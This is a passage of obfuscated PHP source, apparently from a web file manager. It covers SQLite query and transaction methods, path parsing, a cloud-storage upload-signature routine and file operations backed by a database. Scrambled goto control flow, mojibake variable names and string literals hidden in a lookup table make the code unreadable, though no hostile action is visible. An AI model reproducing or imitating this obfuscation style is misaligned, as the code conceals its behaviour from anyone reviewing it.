$this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $eñÂÕñÌäÅ = $this->getAll(); return $eñÂÕñÌäÅ; } goto F×‰¬¹ª¢; Aäî¯²‡è³: $this->queryStr = $fÙ‰ó¯ç÷•; if ($this->queryID) { $this->free(); } think_action_status($A†å·òø¾[19], 1); goto eŒ•Ş×Ú›Â; C½Ç±º½ é: $A†å·òø¾ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Aäî¯²‡è³; F×‰¬¹ª¢: } public function execute($aê¹æÌ²èš) { goto A…†¾õŠ£; cç«¯Ü‚—Â: $this->queryStr = $aê¹æÌ²èš; if ($this->queryID) { $this->free(); } think_action_status($DĞÃŠê’™œ[21], 1); goto eŸÜìºëææ; eŸÜìºëææ: think_status($DĞÃŠê’™œ[20]); $Eíí²‹¥™® = sqlite_exec($this->_linkID, $aê¹æÌ²èš); $this->debug(); goto bôÅ†Öê©; A…†¾õŠ£: $DĞÃŠê’™œ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cç«¯Ü‚—Â; bôÅ†Öê©: if (!1 === $Eíí²‹¥™®) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b—Ö¯¤Ï§”; b—Ö¯¤Ï§”: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[İë¬“ÅÒÛ›][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aö×ÊÓ¶ = sqlite_query($this->_linkID, $_SERVER[İë¬“ÅÒÛ›][23]); if (!$aö×ÊÓ¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dì‚İäì’œ = sqlite_query($this->_linkID, $_SERVER[İë¬“ÅÒÛ›][24]); if (!$Dì‚İäì’œ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E¦¡¸µ¯—Á = array(); if ($this->numRows > 0) { for ($dêè ‹²… = 0; $dêè ‹²… < $this->numRows; $dêè ‹²…++) { $E¦¡¸µ¯—Á[$dêè ‹²…] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $E¦¡¸µ¯—Á; } public function getFields($e²‡²ÕãÖŸ) { $a´†ªíÊ£ =& $_SERVER[İë¬“ÅÒÛ›]; $d÷õŒ¸îƒÕ = $this->query($a´†ªíÊ£[25] . $e²‡²ÕãÖŸ . $a´†ªíÊ£[26]); $B•ï¿‚ÇÀ‡ = array(); if ($d÷õŒ¸îƒÕ) { foreach ($d÷õŒ¸îƒÕ as $dæ‚õå”ŸÖ => $A½èŞ¹‹ƒ) { $B•ï¿‚ÇÀ‡[$A½èŞ¹‹ƒ[$a´†ªíÊ£[27]]] = array($a´†ªíÊ£[28] => $A½èŞ¹‹ƒ[$a´†ªíÊ£[27]], $a´†ªíÊ£[29] => $A½èŞ¹‹ƒ[$a´†ªíÊ£[30]], $a´†ªíÊ£[31] => (bool) ($A½èŞ¹‹ƒ[$a´†ªíÊ£[32]] === $a´†ªíÊ£[33]), $a´†ªíÊ£[34] => $A½èŞ¹‹ƒ[$a´†ªíÊ£[35]], $a´†ªíÊ£[36] => strtolower($A½èŞ¹‹ƒ[$a´†ªíÊ£[37]]) == $a´†ªíÊ£[38], $a´†ªíÊ£[39] => strtolower($A½èŞ¹‹ƒ[$a´†ªíÊ£[40]]) == $a´†ªíÊ£[41]); } } return $B•ï¿‚ÇÀ‡; } public function getTables($AŠ”ôˆÛ»Ä = '') { $fÓ³‘¡†øá =& $_SERVER[İë¬“ÅÒÛ›]; $E¯Ò´íÅ˜Ã = $this->query($fÓ³‘¡†øá[42] . $fÓ³‘¡†øá[43] . $fÓ³‘¡†øá[44]); $F„œø¨‘£ø = array(); foreach ($E¯Ò´íÅ˜Ã as $C¸Š…Ã• => $A‹Ôáåë’) { $F„œø¨‘£ø[$C¸Š…Ã•] = current($A‹Ôáåë’); } return $F„œø¨‘£ø; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $f„›ŸœİÈô =& $_SERVER[İë¬“ÅÒÛ›]; $b½ÁÚÍ¡† = sqlite_last_error($this->_linkID); $this->error = $b½ÁÚÍ¡† . $f„›ŸœİÈô[4] . sqlite_error_string($b½ÁÚÍ¡†); if ($f„›ŸœİÈô[33] != $this->queryStr) { $this->error .= LNG($f„›ŸœİÈô[45]) . $this->queryStr; } think_trace($this->error, $f„›ŸœİÈô[33], $f„›ŸœİÈô[46]); return $this->error; } public function escapeString($e¸àë—¼°) { return sqlite_escape_string($e¸àë—¼°); } public function parseLimit($fÀ²öãçó) { $Bßš©¿Òº =& $_SERVER[İë¬“ÅÒÛ›]; $e¢‚ß‚ª‚… = $Bßš©¿Òº[33]; if (!empty($fÀ²öãçó)) { $fÀ²öãçó = explode($Bßš©¿Òº[47], $fÀ²öãçó); if (count($fÀ²öãçó) > 1) { $e¢‚ß‚ª‚… .= $Bßš©¿Òº[48] . $fÀ²öãçó[1] . $Bßš©¿Òº[49] . $fÀ²öãçó[0] . $Bßš©¿Òº[50]; } else { $e¢‚ß‚ª‚… .= $Bßš©¿Òº[48] . $fÀ²öãçó[0] . $Bßš©¿Òº[50]; } } return $e¢‚ß‚ª‚…; } } goto DÍ†ÜØ¼‰Á; DÂêêª©â: class KodIO { const KOD_SOURCE = "\x7b\163\157\165\162\143\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\145\162\122\x65\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\x69\154\x65\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\162\106\151\154\x65\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\x70\122\157\157\x74\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\173\165\x73\145\x72\x53\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\x53\x68\141\x72\x65\x4c\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\145\x49\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\150\141\162\x65\111\x74\145\x6d\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\x7b\x73\145\141\162\143\150\175"; const KOD_BLOCK = "\173\x62\x6c\157\x63\153\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\x73\145\162\x52\145\x6e\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x75\163\145\x72\104\162\151\x76\145\x72\x7d"; public static function typeList() { $fùÑÛ†ÆÑ =& $_SERVER[İë¬“ÅÒÛ›]; return array($fùÑÛ†ÆÑ[798] => self::KOD_SOURCE, $fùÑÛ†ÆÑ[799] => self::KOD_USER_RECYCLE, $fùÑÛ†ÆÑ[800] => self::KOD_USER_FAV, $fùÑÛ†ÆÑ[801] => self::KOD_USER_FILE_TAG, $fùÑÛ†ÆÑ[802] => self::KOD_USER_FILE_TYPE, $fùÑÛ†ÆÑ[803] => self::KOD_GROUP_ROOT_SELF, $fùÑÛ†ÆÑ[804] => self::KOD_USER_SHARE, $fùÑÛ†ÆÑ[805] => self::KOD_USER_SHARE_LINK, $fùÑÛ†ÆÑ[806] => self::KOD_USER_SHARE_TO_ME, $fùÑÛ†ÆÑ[807] => self::KOD_SHARE_ITEM, $fùÑÛ†ÆÑ[808] => self::KOD_SHARE_LINK, $fùÑÛ†ÆÑ[809] => self::KOD_SEARCH, $fùÑÛ†ÆÑ[810] => self::KOD_BLOCK, $fùÑÛ†ÆÑ[811] => self::KOD_IO, $fùÑÛ†ÆÑ[812] => self::KOD_USER_RECENT, $fùÑÛ†ÆÑ[813] => self::KOD_USER_DRIVER); } public static function parse($D«Ë‚’ÎÊ) { goto B¦ŞÃëª¯Ö; B¦ŞÃëª¯Ö: $bÄ˜˜İ¡×‡ =& $_SERVER[İë¬“ÅÒÛ›]; $D«Ë‚’ÎÊ = self::clear($D«Ë‚’ÎÊ); $d®í£¯´Ç = array_values(self::typeList()); goto dä³¹šÇœ¥; dä³¹šÇœ¥: preg_match($bÄ˜˜İ¡×‡[814], $D«Ë‚’ÎÊ, $D›‘ù—¯‘Æ); $dÖÂöÍ¯¨Å = array($bÄ˜˜İ¡×‡[815] => !1, $bÄ˜˜İ¡×‡[816] => !1, $bÄ˜˜İ¡×‡[817] => !1, $bÄ˜˜İ¡×‡[76] => $D«Ë‚’ÎÊ, $bÄ˜˜İ¡×‡[761] => !1, $bÄ˜˜İ¡×‡[760] => $bÄ˜˜İ¡×‡[33]); if (is_array($D›‘ù—¯‘Æ) && count($D›‘ù—¯‘Æ) == 5) { $CÑ±­–ÚÌë = $bÄ˜˜İ¡×‡[818] . $D›‘ù—¯‘Æ[2] . $bÄ˜˜İ¡×‡[319]; if (in_array($CÑ±­–ÚÌë, $d®í£¯´Ç)) { $dÖÂöÍ¯¨Å[$bÄ˜˜İ¡×‡[761]] = $D›‘ù—¯‘Æ[1]; $dÖÂöÍ¯¨Å[$bÄ˜˜İ¡×‡[29]] = $CÑ±­–ÚÌë; $dÖÂöÍ¯¨Å[$bÄ˜˜İ¡×‡[819]] = substr($CÑ±­–ÚÌë, 1, -1); $dÖÂöÍ¯¨Å[$bÄ˜˜İ¡×‡[369]] = $D›‘ù—¯‘Æ[3]; } $dÖÂöÍ¯¨Å[$bÄ˜˜İ¡×‡[760]] = $D›‘ù—¯‘Æ[4]; } goto eäÙÂÄÑ‚Ç; eäÙÂÄÑ‚Ç: return $dÖÂöÍ¯¨Å; goto dˆ—¾ŠÀö…; dˆ—¾ŠÀö…: } public static function clear($d«¯Š›‚çï) { goto c¤êŠô¶–; C¹‹¬Ê¯ã¨: if ($d«¯Š›‚çï == $EØÔµ¶§¹[8]) { return $EØÔµ¶§¹[8]; } $d«¯Š›‚çï = rtrim($d«¯Š›‚çï, $EØÔµ¶§¹[8]); return $d«¯Š›‚çï; goto EÛÁ„Àö¢§; aËè²“èÆ“: if (substr($d«¯Š›‚çï, 0, 3) == $EØÔµ¶§¹[821]) { $d«¯Š›‚çï = substr($d«¯Š›‚çï, 3); } while (strstr($d«¯Š›‚çï, $bí“–ÛøÀ)) { $d«¯Š›‚çï = str_replace($bí“–ÛøÀ, $EØÔµ¶§¹[8], $d«¯Š›‚çï); } $d«¯Š›‚çï = preg_replace($EØÔµ¶§¹[822], $EØÔµ¶§¹[8], $d«¯Š›‚çï); goto C¹‹¬Ê¯ã¨; c¤êŠô¶–: $EØÔµ¶§¹ =& $_SERVER[İë¬“ÅÒÛ›]; $d«¯Š›‚çï = str_replace($EØÔµ¶§¹[94], $EØÔµ¶§¹[8], $d«¯Š›‚çï); $bí“–ÛøÀ = $EØÔµ¶§¹[820]; goto aËè²“èÆ“; EÛÁ„Àö¢§: } public static function sourceID($dÄ‘¸³‡ã®) { $CÚÑ”ã°’È =& $_SERVER[İë¬“ÅÒÛ›]; $dÂ­ŞªÑµ = self::parse($dÄ‘¸³‡ã®); if ($dÂ­ŞªÑµ[$CÚÑ”ã°’È[29]] !== self::KOD_SOURCE) { show_json(LNG($CÚÑ”ã°’È[823]), !1); } return $dÂ­ŞªÑµ[$CÚÑ”ã°’È[369]]; } public static function make($fÖÀùºÆ’) { if (!$fÖÀùºÆ’) { return !1; } return self::makePath(self::KOD_SOURCE, intval($fÖÀùºÆ’)); } public static function makeShare($A·«¿ƒ©ì„, $c‹»ãÜ›İ) { return self::makePath(self::KOD_SHARE_ITEM, $A·«¿ƒ©ì„, $c‹»ãÜ›İ); } public static function makeFileTypePath($BÆ­¹éºä) { return self::makePath(self::KOD_USER_FILE_TYPE, $BÆ­¹éºä); } public static function makeFileTagPath($dë­§ù³‡‡) { return self::makePath(self::KOD_USER_FILE_TAG, $dë­§ù³‡‡); } public static function makePath($F·î—˜’Æ, $e»¦²Í¸½Í = '', $a„Ê±³Éô = '') { $fåñ¯ÆÄ =& $_SERVER[İë¬“ÅÒÛ›]; $bœï¾®íï¬ = substr($F·î—˜’Æ, 1, -1); $bƒİÍŠ¯„‘ = $fåñ¯ÆÄ[824] . $bœï¾®íï¬ . $fåñ¯ÆÄ[493] . $e»¦²Í¸½Í . $fåñ¯ÆÄ[825]; $bƒİÍŠ¯„‘ = $a„Ê±³Éô ? $bƒİÍŠ¯„‘ . $a„Ê±³Éô . $fåñ¯ÆÄ[8] : $bƒİÍŠ¯„‘; return $bƒİÍŠ¯„‘; } public static function initSystemPath() { $eÛÛëÃé =& $_SERVER[İë¬“ÅÒÛ›]; $AË¢À­Š’ = array($eÛÛëÃé[826] => $eÛÛëÃé[827], $eÛÛëÃé[828] => $eÛÛëÃé[829], $eÛÛëÃé[830] => $eÛÛëÃé[831], $eÛÛëÃé[832] => $eÛÛëÃé[833]); foreach ($AË¢À­Š’ as $b¼²ù‚‹ => $cÚ§ˆ…‚Ò™) { if (!defined($b¼²ù‚‹)) { define($b¼²ù‚‹, self::systemPath($cÚ§ˆ…‚Ò™)); } } } private static function systemPath($b‚Ïîà¸¿µ) { goto dïëİåñ”; dïëİåñ”: $d’†×é« =& $_SERVER[İë¬“ÅÒÛ›]; $Dí»²…Ÿ¬’ = $d’†×é«[834] . ucfirst($b‚Ïîà¸¿µ); $dç®¨Ø­À¡ = Model($d’†×é«[835])->get($Dí»²…Ÿ¬’); goto Dö…ï¹œµß; AàÍÅñ•¯Ê: return $dç®¨Ø­À¡; goto FŒƒ³Ù­Ğ’; Dö…ï¹œµß: if ($dç®¨Ø­À¡) { return $dç®¨Ø­À¡; } if ($b‚Ïîà¸¿µ == $d’†×é«[827]) { $dç®¨Ø­À¡ = self::make(Model($d’†×é«[522])->systemRootPathAdd($d’†×é«[836])); } else { $dç®¨Ø­À¡ = self::systemPath($d’†×é«[827]); $ağÒÙñ¿Ü  = self::sourceID($dç®¨Ø­À¡); $dç®¨Ø­À¡ = self::make(Model($d’†×é«[522])->mkdir($ağÒÙñ¿Ü , $b‚Ïîà¸¿µ)); } Model($d’†×é«[835])->set($Dí»²…Ÿ¬’, $dç®¨Ø­À¡); goto AàÍÅñ•¯Ê; FŒƒ³Ù­Ğ’: } public static function systemFolder($AÜÚœÀ¬¹¬) { $eøÍ²¨Ìâ = IO_PATH_SYSTEM_SOURCE . $AÜÚœÀ¬¹¬; $bˆù»Ë‡ = Cache::get($eøÍ²¨Ìâ); if (!$bˆù»Ë‡) { $Fº•ç‘¢Â = IO::infoFull($eøÍ²¨Ìâ); if (!$Fº•ç‘¢Â) { $bˆù»Ë‡ = IO::mkdir($eøÍ²¨Ìâ, REPEAT_SKIP); } else { $bˆù»Ë‡ = $Fº•ç‘¢Â[$_SERVER[İë¬“ÅÒÛ›][76]]; } Cache::set($eøÍ²¨Ìâ, $bˆù»Ë‡, 3600 * 10); } return $bˆù»Ë‡; } public static function defaultDriver() { return Model($_SERVER[İë¬“ÅÒÛ›][462])->defaultDriver(); } public static function defaultIO() { $d˜Ï¨‘¥® =& $_SERVER[İë¬“ÅÒÛ›]; $D¾öÏ»÷×Ë = self::defaultDriver(); return $d˜Ï¨‘¥®[837] . $D¾öÏ»÷×Ë[$d˜Ï¨‘¥®[369]] . $d˜Ï¨‘¥®[825]; } public static function fileTypeList() { $CóßÊ½åÖß =& $_SERVER[İë¬“ÅÒÛ›]; $eùÍò×ÃòÇ = $GLOBALS[$CóßÊ½åÖß[6]][$CóßÊ½åÖß[838]]; foreach ($eùÍò×ÃòÇ as $BÛÜ™ÊÄ« => $e„İ ‚¡Äà) { $aÛõì×á®À = $CóßÊ½åÖß[839] . $BÛÜ™ÊÄ«; $E…Ö‚¯­İ = LNG($aÛõì×á®À); if ($aÛõì×á®À != $E…Ö‚¯­İ) { $eùÍò×ÃòÇ[$BÛÜ™ÊÄ«][$CóßÊ½åÖß[28]] = $E…Ö‚¯­İ; } } return $eùÍò×ÃòÇ; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($DëãÏˆ–) { parent::__construct($DëãÏˆ–); $this->signatureVersion($_SERVER[İë¬“ÅÒÛ›][200]); } public function uploadFormData($F §æé²³, $DÄÔÀ¬ Ö¬ = 3600) { goto f¿ÖÔ”Á—; EêÇ¬·…¸İ: $Fãíçë» = $C¶Æ¬ğªÂå[840]; $DİÚ„ãÍÙÚ = gmdate($C¶Æ¬ğªÂå[841], time() + $DÄÔÀ¬ Ö¬); $Bëóä­ä…è = (string) time() . $C¶Æ¬ğªÂå[68] . (string) (time() + $DÄÔÀ¬ Ö¬); goto f¦šÍ†‘¨; B„¹ÖéÖ: $cøÏ¾—¨Ïê = sha1($dÎˆìİÚ); $D‡ºÛôİŒ = hash_hmac($C¶Æ¬ğªÂå[225], $cøÏ¾—¨Ïê, $EÀ‹Ê¦ôãé); $cÔÕÂ¥˜Úå = array($C¶Æ¬ğªÂå[844] => $AÛ°«ˆÉ­­, $C¶Æ¬ğªÂå[848] => $Fãíçë», $C¶Æ¬ğªÂå[852] => base64_encode($dÎˆìİÚ), $C¶Æ¬ğªÂå[849] => $cæ‡…Æ¸Ğâ, $C¶Æ¬ğªÂå[850] => $this->accessKey, $C¶Æ¬ğªÂå[853] => $Bëóä­ä…è, $C¶Æ¬ğªÂå[854] => $D‡ºÛôİŒ, $C¶Æ¬ğªÂå[166] => $this->getHost()); goto Fæ¢¥†ä¢¦; Fæ¢¥†ä¢¦: return $cÔÕÂ¥˜Úå; goto e†ô¯¡·—ì; f¦šÍ†‘¨: $dÎˆìİÚ = array($C¶Æ¬ğªÂå[842] => $DİÚ„ãÍÙÚ, $C¶Æ¬ğªÂå[843] => array(array($C¶Æ¬ğªÂå[844] => $AÛ°«ˆÉ­­), array($C¶Æ¬ğªÂå[845] => $this->bucket), array($C¶Æ¬ğªÂå[846], $C¶Æ¬ğªÂå[847], $C¶Æ¬ğªÂå[33]), array($C¶Æ¬ğªÂå[848] => $Fãíçë»), array($C¶Æ¬ğªÂå[849] => $cæ‡…Æ¸Ğâ), array($C¶Æ¬ğªÂå[850] => $this->accessKey), array($C¶Æ¬ğªÂå[851] => $Bëóä­ä…è))); $dÎˆìİÚ = json_encode($dÎˆìİÚ); $EÀ‹Ê¦ôãé = hash_hmac($C¶Æ¬ğªÂå[225], $Bëóä­ä…è, $this->secret); goto B„¹ÖéÖ; f¿ÖÔ”Á—: $C¶Æ¬ğªÂå =& $_SERVER[İë¬“ÅÒÛ›]; $AÛ°«ˆÉ­­ = $C¶Æ¬ğªÂå[182]; $cæ‡…Æ¸Ğâ = $C¶Æ¬ğªÂå[225]; goto EêÇ¬·…¸İ; e†ô¯¡·—ì: } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($FêÜ´‚ù¤–) { $this->pathParse = $FêÜ´‚ù¤–; $this->model = Model($_SERVER[İë¬“ÅÒÛ›][855]); } public function getPath($B…¸Ó®—•) { return trim($B…¸Ó®—•, $_SERVER[İë¬“ÅÒÛ›][8]); } public function pathFather($FÚ…õ–ÎÌƒ) { $e±‹Ú÷ëç = $this->parse($FÚ…õ–ÎÌƒ); $e±‹Ú÷ëç = $this->infoSimple($FÚ…õ–ÎÌƒ); return $e±‹Ú÷ëç ? $e±‹Ú÷ëç[$_SERVER[İë¬“ÅÒÛ›][385]] : !1; } public function getPathName($c«ë©¬²µŠ) { $B©åŒØåŒª = $this->infoSimple($c«ë©¬²µŠ); return $B©åŒØåŒª ? $B©åŒØåŒª[$_SERVER[İë¬“ÅÒÛ›][28]] : !1; } public function getPathOuter($f‘¸¢Ó¸Ò) { if (!$f‘¸¢Ó¸Ò) { return $f‘¸¢Ó¸Ò; } $e½Õ”×ÒìÂ = $this->parse($f‘¸¢Ó¸Ò); return KodIO::make($e½Õ”×ÒìÂ[$_SERVER[İë¬“ÅÒÛ›][369]]); } public function copyFolderFromIO($d Ö—‹½“÷, $Bî¯Ç‹’ƒµ, $d§İºóàÖÕ, $B¶Û¼Ëè÷£, $cÛ¥¿ãÓñ) { $Fô§„¹´³¯ = $this->model->copyFolderFromIO($d Ö—‹½“÷, $Bî¯Ç‹’ƒµ, $d§İºóàÖÕ, $B¶Û¼Ëè÷£, $cÛ¥¿ãÓñ); return KodIO::make($Fô§„¹´³¯); } public function isParentOf($fê³æŒ÷…Ó, $bŠÚœŞ×) { return $this->model->isParentOf($fê³æŒ÷…Ó, $bŠÚœŞ×); } public function mkfile($f‹ï’™ğÏÇ, $eÖŒÍƒ‘éê = '', $DÔ±ëÁĞ¯¨ = REPEAT_RENAME) { $c¹Àã±‡Ÿ =& $_SERVER[İë¬“ÅÒÛ›]; $C¶Àêç‘±Í = $this->parse($f‹ï’™ğÏÇ); $f‹ï’™ğÏÇ = $C¶Àêç‘±Í[$c¹Àã±‡Ÿ[369]]; for ($CÂï˜Æ—Ÿ = 0; $CÂï˜Æ—Ÿ < count($C¶Àêç‘±Í[$c¹Àã±‡Ÿ[856]]); $CÂï˜Æ—Ÿ++) { $Eƒç÷êóíë = $C¶Àêç‘±Í[$c¹Àã±‡Ÿ[856]][$CÂï˜Æ—Ÿ]; $AÏ˜˜‰”Å• = "\120\x61\x74\150\104\162\151\166\x65\162\104\x42\56\x6d\x6b\144\151\x72\x2e{$f‹ï’™ğÏÇ}\x2e{$Eƒç÷êóíë}"; CacheLock::lock($AÏ˜˜‰”Å•); if ($CÂï˜Æ—Ÿ == count($C¶Àêç‘±Í[$c¹Àã±‡Ÿ[856]]) - 1) { $f‹ï’™ğÏÇ = $this->model->mkfile($f‹ï’™ğÏÇ, $Eƒç÷êóíë, $eÖŒÍƒ‘éê, $DÔ±ëÁĞ¯¨); CacheLock::unlock($AÏ˜˜‰”Å•); break; } $f‹ï’™ğÏÇ = $this->model->mkdir($f‹ï’™ğÏÇ, $Eƒç÷êóíë, REPEAT_SKIP); CacheLock::unlock($AÏ˜˜‰”Å•); } return $this->getPathOuter($f‹ï’™ğÏÇ); } public function mkdir($BŠ¢›‘Æ”¬, $A†¬ÓÆÊ˜ = REPEAT_SKIP) { $fŠÁ¿¯‘½­ =& $_SERVER[İë¬“ÅÒÛ›]; $DöÃÆ•÷ÆŠ = $this->parse($BŠ¢›‘Æ”¬); $BŠ¢›‘Æ”¬ = $DöÃÆ•÷ÆŠ[$fŠÁ¿¯‘½­[369]]; for ($EÜ³ª°ñÚù = 0; $EÜ³ª°ñÚù < count($DöÃÆ•÷ÆŠ[$fŠÁ¿¯‘½­[856]]); $EÜ³ª°ñÚù++) { $Aî‰¬¡øí› = $DöÃÆ•÷ÆŠ[$fŠÁ¿¯‘½­[856]][$EÜ³ª°ñÚù]; $cñ¡¤÷†† = "\x50\x61\164\x68\104\162\151\166\145\162\104\x42\56\155\153\x64\151\162\56{$BŠ¢›‘Æ”¬}\56{$Aî‰¬¡øí›}"; CacheLock::lock($cñ¡¤÷††); $BŠ¢›‘Æ”¬ = $this->model->mkdir($BŠ¢›‘Æ”¬, $Aî‰¬¡øí›, $A†¬ÓÆÊ˜); CacheLock::unlock($cñ¡¤÷††); } return $this->getPathOuter($BŠ¢›‘Æ”¬); } public function copyFile($bñ™ìØ¸‹ò, $EŸæ£–×ù, $E•œ¤‰ì… = REPEAT_REPLACE) { $B­£ã“¶‚ó =& $_SERVER[İë¬“ÅÒÛ›]; $Aë†‘Ü§èÒ = $this->parse($EŸæ£–×ù); $C»Ûâµá„ = $this->model->copy($bñ™ìØ¸‹ò, $Aë†‘Ü§èÒ[$B­£ã“¶‚ó[369]], $E•œ¤‰ì…, $Aë†‘Ü§èÒ[$B­£ã“¶‚ó[76]]); return $C»Ûâµá„ ? $this->getPathOuter($C»Ûâµá„) : !1; } public function moveFile($aŒ¶ôãÌ°, $Dİ ¤¯ “, $BÃèò ‡ø¢ = REPEAT_REPLACE) { $CğíÏ×ÒĞ‡ =& $_SERVER[İë¬“ÅÒÛ›]; $Eº—°ÜôÔ = $this->parse($Dİ ¤¯ “); $F¯µµ„ÀÌÏ = $this->model->move($aŒ¶ôãÌ°, $Eº—°ÜôÔ[$CğíÏ×ÒĞ‡[369]], $BÃèò ‡ø¢, $Eº—°ÜôÔ[$CğíÏ×ÒĞ‡[76]]); return $F¯µµ„ÀÌÏ ? $this->getPathOuter($F¯µµ„ÀÌÏ) : !1; } public function copy($e±¨Õ¼ì…¶, $B¿Ú Ò©Ë‚, $CÓ¡’¯ä¤‰ = REPEAT_REPLACE) { $Dã£Ğ¶ä…É = $this->parse($B¿Ú Ò©Ë‚); $féëĞæ®†é = $this->model->copy($e±¨Õ¼ì…¶, $Dã£Ğ¶ä…É[$_SERVER[İë¬“ÅÒÛ›][369]], $CÓ¡’¯ä¤‰); return $féëĞæ®†é ? $this->getPathOuter($féëĞæ®†é) : !1; } public function move($AôïÕ®Õ²ª, $E×ëĞÃõœÍ, $D–ˆØÌ†’Œ = REPEAT_REPLACE) { $CˆØ¹Œ½‘‚ = $this->parse($E×ëĞÃõœÍ); $Fìß£–íœí = $this->model->move($AôïÕ®Õ²ª, $CˆØ¹Œ½‘‚[$_SERVER[İë¬“ÅÒÛ›][369]], $D–ˆØÌ†’Œ); return $Fìß£–íœí ? $this->getPathOuter($Fìß£–íœí) : !1; } public function remove($Dé¸ã¦ìŞ³, $Eï”é¾‰Ö¥ = true) { return $this->model->remove($Dé¸ã¦ìŞ³, $Eï”é¾‰Ö¥); } public function rename($b¿¤‡Ê¶ùŞ, $Dëç‚µ’¸) { $cŠ¨¬Í¶ó = $this->model->rename($b¿¤‡Ê¶ùŞ, $Dëç‚µ’¸); return $cŠ¨¬Í¶ó ? $this->getPathOuter($b¿¤‡Ê¶ùŞ) : $cŠ¨¬Í¶ó; } public function size($Fö„Ú÷øº) { $eï‰ùƒ‘î = $this->infoSimple($Fö„Ú÷øº); return $eï‰ùƒ‘î ? $eï‰ùƒ‘î[$_SERVER[İë¬“ÅÒÛ›][78]] : 0; } public function infoSimple($Aé†õ‚) { return $this->model->sourceInfo($Aé†õ‚); } public function info($EŸ¼Õô“‘º) { return $this->infoParse($EŸ¼Õô“‘º); } public function infoAuth($C´ôå½›) { return $this->infoParse($C´ôå½›, !1, !0); } public function infoWithChildren($FÔä‚Á¯œ) { return $this->infoParse($FÔä‚Á¯œ, !0); } protected function infoParse($dÌĞ•‘ê×°, $cèø®ËÄé­ = false, $BÖ³´Ã–Ø = false) { if (!$cèø®ËÄé­) { return $this->model->pathInfo($dÌĞ•‘ê×°, $BÖ³´Ã–Ø); } return $this->model->pathInfoMore($dÌĞ•‘ê×°); } public function infoFull($FãÖÙ¿Æ) { $E’Àö¶¢°— =& $_SERVER[İë¬“ÅÒÛ›]; $eáŞ ŒôİÃ = explode($E’Àö¶¢°—[8], $FãÖÙ¿Æ); $b”˜ñì¼ªÌ = implode($E’Àö¶¢°—[8], array_splice($eáŞ ŒôİÃ, 1)); return $this->model->pathInfoByPath($eáŞ ŒôİÃ[0], $b”˜ñì¼ªÌ); } public function hashSimple($AËôÜùá™) { $eÙë‰¶ïœ =& $_SERVER[İë¬“ÅÒÛ›]; $AÉÛÁ®È¶… = $this->infoWithChildren($AËôÜùá™); return $AÉÛÁ®È¶…[$eÙë‰¶ïœ[159]][$eÙë‰¶ïœ[161]]; } public function hashMd5($DŠ’Ï¾¹) { $BØ¬¨±‘“ =& $_SERVER[İë¬“ÅÒÛ›]; $AŞØÈ…µßç = $this->infoWithChildren($DŠ’Ï¾¹); return $AŞØÈ…µßç[$BØ¬¨±‘“[159]][$BØ¬¨±‘“[160]]; } public function exist($f•º­ö§º) { $C®œ¤Ï™Ï =& $_SERVER[İë¬“ÅÒÛ›]; $eˆÅñ¤Äæç = $this->parse($f•º­ö§º); if (!$eˆÅñ¤Äæç[$C®œ¤Ï™Ï[76]]) { return $this->isFile($f•º­ö§º) || $this->isFolder($f•º­ö§º); } $eÍÃ´¥› = array($C®œ¤Ï™Ï[399] => $eˆÅñ¤Äæç[$C®œ¤Ï™Ï[369]], $C®œ¤Ï™Ï[28] => $eˆÅñ¤Äæç[$C®œ¤Ï™Ï[76]]); $a¾‹—æã¼³ = $this->model->where($eÍÃ´¥›)->find(); return $a¾‹—æã¼³ ? !0 : !1; } public function isFile($D¬…ã¦†« ) { $a¢©ä±ËÃÀ =& $_SERVER[İë¬“ÅÒÛ›]; $f¹ˆİáñ’ğ = $this->infoSimple($D¬…ã¦†« ); return $f¹ˆİáñ’ğ && $f¹ˆİáñ’ğ[$a¢©ä±ËÃÀ[376]] == $a¢©ä±ËÃÀ[377] ? !1 : !0; } public function isFolder($fÏôé£×°) { $AŞ©Ş°¦Ú =& $_SERVER[İë¬“ÅÒÛ›]; $fö¦œÚš§İ = $this->infoSimple($fÏôé£×°); return $fö¦œÚš§İ && $fö¦œÚš§İ[$AŞ©Ş°¦Ú[376]] == $AŞ©Ş°¦Ú[377] ? !0 : !1; } public function listPath($b­ƒø†©¢°, $aÓìª¢µ¸Ï = false) { $A”Šñ¾Ş÷ =& $_SERVER[İë¬“ÅÒÛ›]; if ($b­ƒø†©¢° == $A”Šñ¾Ş÷[33]) { return !1; } $B¦·òóÍ¯± = array($A”Šñ¾Ş÷[399] => $b­ƒø†©¢°); if ($aÓìª¢µ¸Ï) { return $this->model->listSource($B¦·òóÍ¯±, -1); } return 